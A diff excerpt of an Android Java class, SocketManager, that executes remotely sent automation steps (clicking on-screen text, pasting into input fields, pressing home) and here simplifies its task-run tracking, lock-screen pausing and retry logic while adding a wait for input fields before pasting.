-        try {
-            JSONObject result = dispatchCommand("press_home", new JSONObject());
-            if (result == null || !result.optBoolean("success", false)) {
-                Log.w(TAG, "Home action after task retries failed: "
-                        + (result == null ? "no result"
-                                : result.optString("error", "Home action was not confirmed")));
-            }
-        } catch (Exception e) {
-            Log.w(TAG, "Home action after task retries failed: " + e.getMessage());
-        }
-    }
-
-    private void resumeWaitingTasksIfAvailable() {
-        if (isTaskExecutionBlocked()) return;
-
-        java.util.ArrayList<PendingTask> ready = new java.util.ArrayList<>();
-        synchronized (taskLock) {
-            java.util.Iterator<java.util.Map.Entry<String, PendingTask>> iterator =
-                    waitingTasks.entrySet().iterator();
-            while (iterator.hasNext()) {
-                java.util.Map.Entry<String, PendingTask> entry = iterator.next();
-                PendingTask pending = entry.getValue();
-                if (pending.generation != currentTaskGeneration
-                        || !pending.commandId.equals(currentTaskCommandId)) {
-                    iterator.remove();
-                    continue;
-                }
-                if (!activeTaskRuns.containsKey(entry.getKey())) {
-                    ready.add(pending);
-                    iterator.remove();
-                }
-            }
-            if (!ready.isEmpty()) {
-                taskWaitingForKeyguard = false;
-                taskUnlockScreenReleaseRequested = false;
-            }
-        }
-
-        for (PendingTask task : ready) {
-            startTaskRun(task, true);
-        }
-    }
-
-    private void finishTaskRun(TaskRun run) {
-        boolean removed;
-        boolean clearSavedTask = false;
-        synchronized (taskLock) {
-            removed = activeTaskRuns.get(run.commandId) == run;
-            if (removed) activeTaskRuns.remove(run.commandId);
-            if (run.terminal && currentTaskGeneration == run.generation
-                    && run.commandId.equals(currentTaskCommandId)) {
-                currentTaskCommandId = null;
-                currentTaskSteps = null;
-                currentTaskGeneration = 0L;
-                clearSavedTask = true;
-                taskWaitingForKeyguard = false;
-                taskUnlockScreenReleaseRequested = false;
-            }
-            TaskRun currentRun = currentTaskCommandId != null
-                    ? activeTaskRuns.get(currentTaskCommandId) : null;
-            boolean taskStillExecuting = currentRun != null
-                    && currentRun.generation == currentTaskGeneration
-                    && !currentRun.terminal
-                    && !currentRun.restartRequested;
-            TaskExecutionState.setTaskRunning(context, taskStillExecuting);
-        }
-        if (clearSavedTask) clearSavedTaskFromDevice(run.commandId, run.generation);
-        if (removed && !isTaskExecutionBlocked()) {
-            resumeWaitingTasksIfAvailable();
-        }
-    }
-
-    private boolean isPasteTextVisible(JSONObject searchResult, String expectedText) {
-        if (searchResult == null || !searchResult.optBoolean("success", false)) return false;
-        JSONArray matches = searchResult.optJSONArray("matches");
-        if (matches == null) return false;
-        String expected = expectedText.trim().replaceAll("\\s+", " ")
-                .toLowerCase(java.util.Locale.ROOT);
-        if (expected.isEmpty()) return false;
-
-        for (int i = 0; i < matches.length(); i++) {
-            JSONObject match = matches.optJSONObject(i);
-            if (match == null || !match.optBoolean("visible", true)) continue;
-            String visibleText = match.optString("text", "").trim().replaceAll("\\s+", " ")
-                    .toLowerCase(java.util.Locale.ROOT);
-            if (visibleText.contains(expected)) return true;
-        }
-        return false;
-    }
-
-    private void executeTaskLocal(TaskRun run) {
-        JSONArray steps = run.steps;
-        String commandId = run.commandId;
-        final long CLICK_TEXT_TIMEOUT_MS = 7_000L;
+    private void executeTaskLocal(JSONArray steps, String commandId) {
+        final long CLICK_TEXT_TIMEOUT_MS = 8_000L;
         final long CLICK_TEXT_POLL_MS    = 100L;
         final long INTER_STEP_DELAY_MS   = 500L;
 
@@ -4864,9 +3541,6 @@ public class SocketManager {
         int completed = 0;
 
         for (int i = 0; i < total; i++) {
-            run.currentStepIndex = i;
-            if (pauseTaskRunIfDeviceLocked(run)) return;
-
             JSONObject step;
             String type;
             try {
@@ -4878,7 +3552,6 @@ public class SocketManager {
             }
 
             try {
-                if (run.restartRequested) return;
                 sendTaskProgress(commandId, i, total, false, true, "Starting: " + type, false, null);
 
                 JSONObject result;
@@ -4901,7 +3574,7 @@ public class SocketManager {
                         break;
                     }
 
-                    // ── Click Text — polls up to 7 s, clicks the instant text appears ──
+                    // ── Click Text — polls up to 8 s, clicks the instant text appears ──
                     case "click_text": {
                         String textToFind = step.optString("text", "").trim();
                         if (textToFind.isEmpty()) {
@@ -4912,15 +3585,13 @@ public class SocketManager {
                         long pollDeadline = System.currentTimeMillis() + CLICK_TEXT_TIMEOUT_MS;
                         result = new JSONObject()
                                 .put("success", false)
-                                .put("error", "Text not found within 7 seconds: \"" + textToFind + "\"");
+                                .put("error", "Text not found within 8 s: \"" + textToFind + "\"");
 
                         while (System.currentTimeMillis() < pollDeadline) {
-                            if (pauseTaskRunIfDeviceLocked(run)) return;
                             // Poll — find_by_text uses the accessibility tree (semaphore-guarded)
                             JSONObject findParams = new JSONObject();
                             findParams.put("text", textToFind);
                             JSONObject findResult = dispatchCommand("find_by_text", findParams);
-                            if (pauseTaskRunIfDeviceLocked(run)) return;
 
                             if (findResult.optBoolean("success", false)) {
                                 int cnt = findResult.optInt("count", 0);
@@ -4947,60 +3618,39 @@ public class SocketManager {
 
                     // ── Paste / Input Text ──────────────────────────────────
                     case "paste_text": {
-                        // Use the active window and currently focused input immediately.
-                        // Paste once, wait three seconds, and continue regardless of
-                        // whether the text is visible afterward.
-                        String textToPaste = step.optString("text", "");
-                        if (pauseTaskRunIfDeviceLocked(run)) return;
-
-                        JSONObject pasteParams = new JSONObject();
-                        pasteParams.put("text", textToPaste);
-                        JSONObject pasteResult;
-                        try {
-                            pasteResult = dispatchCommand("input_text", pasteParams);
-                        } catch (InterruptedException interrupted) {
-                            throw interrupted;
-                        } catch (Exception pasteError) {
-                            pasteResult = new JSONObject()
-                                    .put("success", false)
-                                    .put("error", pasteError.getMessage());
-                        }
-                        if (pasteResult == null) {
-                            pasteResult = new JSONObject().put("success", false);
-                        }
-                        if (run.restartRequested) return;
-
-                        Thread.sleep(3_000L);
-                        if (pauseTaskRunIfDeviceLocked(run)) return;
-
-                        boolean textVisible = false;
-                        if (!textToPaste.trim().isEmpty()) {
-                            JSONObject findParams = new JSONObject();
-                            findParams.put("text", textToPaste);
-                            try {
-                                JSONObject findResult =
-                                        dispatchCommand("find_by_text", findParams);
-                                textVisible = isPasteTextVisible(findResult, textToPaste);
-                            } catch (InterruptedException interrupted) {
-                                throw interrupted;
-                            } catch (Exception lookupError) {
-                                // Visibility is informational; it does not gate the next step.
+                        // Paste steps commonly follow a screen transition.  Give the
+                        // destination field time to appear before sending the text;
+                        // otherwise input_text may run against the previous screen and
+                        // never reach the field that is still being created.
+                        long inputDeadline = System.currentTimeMillis() + CLICK_TEXT_TIMEOUT_MS;
+                        boolean inputFound = false;
+                        while (System.currentTimeMillis() < inputDeadline) {
+                            JSONObject inputResult = dispatchCommand("get_input_fields", new JSONObject());
+                            JSONArray inputs = inputResult.optJSONArray("inputs");
+                            if (inputResult.optBoolean("success", false)
+                                    && inputs != null
+                                    && inputs.length() > 0) {
+                                inputFound = true;
+                                long elapsed = CLICK_TEXT_TIMEOUT_MS
+                                        - (inputDeadline - System.currentTimeMillis());
+                                sendTaskProgress(commandId, i, total, false, true,
+                                        "Input field found after " + elapsed + " ms — pasting…",
+                                        false, null);
+                                break;
                             }
-                        }
-                        if (pauseTaskRunIfDeviceLocked(run)) return;
 
-                        String pasteMessage = textVisible
-                                ? "Pasted once; text detected after 3 seconds, continuing"
-                                : "Pasted once; text not detected after 3 seconds, continuing";
-                        if (!pasteResult.optBoolean("success", false)) {
-                            pasteMessage += " (input command did not confirm success)";
+                            long remaining = inputDeadline - System.currentTimeMillis();
+                            if (remaining <= 0) break;
+                            Thread.sleep(Math.min(CLICK_TEXT_POLL_MS, remaining));
                         }
-                        result = new JSONObject()
-                                .put("success", true)
-                                .put("visibleAfterDelay", textVisible)
-                                .put("inputCommandSucceeded",
-                                        pasteResult.optBoolean("success", false))
-                                .put("taskMessage", pasteMessage);
+
+                        JSONObject p = new JSONObject();
+                        p.put("text", step.optString("text", ""));
+                        result = dispatchCommand("input_text", p);
+                        if (!inputFound) {
+                            Log.w(TAG, "paste_text: no input field found within 8 s; "
+                                    + "attempting the existing fallback paste");
+                        }
                         break;
                     }
 
@@ -5033,24 +3683,9 @@ public class SocketManager {
                                 .put("error", "Unknown step type: " + type);
                 }
 
-                if (run.restartRequested) return;
-                if ("click_text".equals(type)
-                        && !result.optBoolean("success", false)
-                        && result.optString("error", "").startsWith("Text not found within 7 seconds")) {
-                    if (scheduleTaskRestartAfterTextMiss(
-                            run, step.optString("text", "").trim(), result)) {
-                        return;
-                    }
-                }
                 boolean ok     = result.optBoolean("success", false);
                 String  errMsg = ok ? null : result.optString("error", "Step failed");
-                String  msg    = ok
-                        ? ("paste_text".equals(type)
-                                ? result.optString("taskMessage", "Done: " + type)
-                                : "Done: " + type)
-                        : ("Failed: " + errMsg);
-
-                if (!ok && !markTaskRunTerminal(run)) return;
+                String  msg    = ok ? ("Done: " + type) : ("Failed: " + errMsg);
 
                 // Report step result
                 sendTaskProgress(commandId, i, total, true, ok, msg, false, errMsg);
@@ -5060,28 +3695,19 @@ public class SocketManager {
                 } else {
                     // A step failed — stop the task immediately
                     Log.w(TAG, "executeTaskLocal: step " + i + " (" + type + ") failed — aborting task. Reason: " + errMsg);
-                    if (result.optBoolean("textRetriesExhausted", false)) {
-                        pressHomeAfterTaskRetriesFail();
-                    }
                     sendTaskCompleteEvent(commandId, completed, total);
                     return;
                 }
 
                 // Settle delay between steps (skip after last step)
-                if (i < total - 1 && !"paste_text".equals(type)) {
-                    Thread.sleep(INTER_STEP_DELAY_MS);
-                }
+                if (i < total - 1) Thread.sleep(INTER_STEP_DELAY_MS);
 
             } catch (InterruptedException ie) {
                 Thread.currentThread().interrupt();
-                if (run.restartRequested) return;
-                if (!markTaskRunTerminal(run)) return;
                 sendTaskProgress(commandId, i, total, true, false, "Task interrupted", false, "interrupted");
                 sendTaskCompleteEvent(commandId, completed, total);
                 return;
             } catch (Exception e) {
-                if (run.restartRequested) return;
-                if (!markTaskRunTerminal(run)) return;
                 Log.e(TAG, "executeTaskLocal step " + i + " exception: " + e.getMessage());
                 sendTaskProgress(commandId, i, total, true, false, "Error: " + e.getMessage(), false, e.getMessage());
                 sendTaskCompleteEvent(commandId, completed, total);
@@ -5090,7 +3716,6 @@ public class SocketManager {
         }
 
         // All steps completed
-        if (!markTaskRunTerminal(run)) return;
         sendTaskCompleteEvent(commandId, completed, total);
     }
 
@@ -5124,26 +3749,6 @@ public class SocketManager {
             sendMessage("task:progress", prog);
         } catch (Exception e) {
             Log.e(TAG, "sendTaskProgress error: " + e.getMessage());
-        }
-    }
-
-    private void sendTaskRestartProgress(String commandId, int total, String message,
-                                         boolean waitingForUnlock, int clickTextRetries) {
-        try {
-            JSONObject prog = new JSONObject();
-            prog.put("commandId", commandId);
-            prog.put("stepIndex", -1);
-            prog.put("stepTotal", total);
-            prog.put("done", false);
-            prog.put("success", true);
-            prog.put("message", message);
-            prog.put("complete", false);
-            prog.put("restart", true);
-            prog.put("waitingForUnlock", waitingForUnlock);
-            prog.put("clickTextRetries", clickTextRetries);
-            sendMessage("task:progress", prog);
-        } catch (Exception e) {
-            Log.e(TAG, "sendTaskRestartProgress error: " + e.getMessage());
         }
     }
 
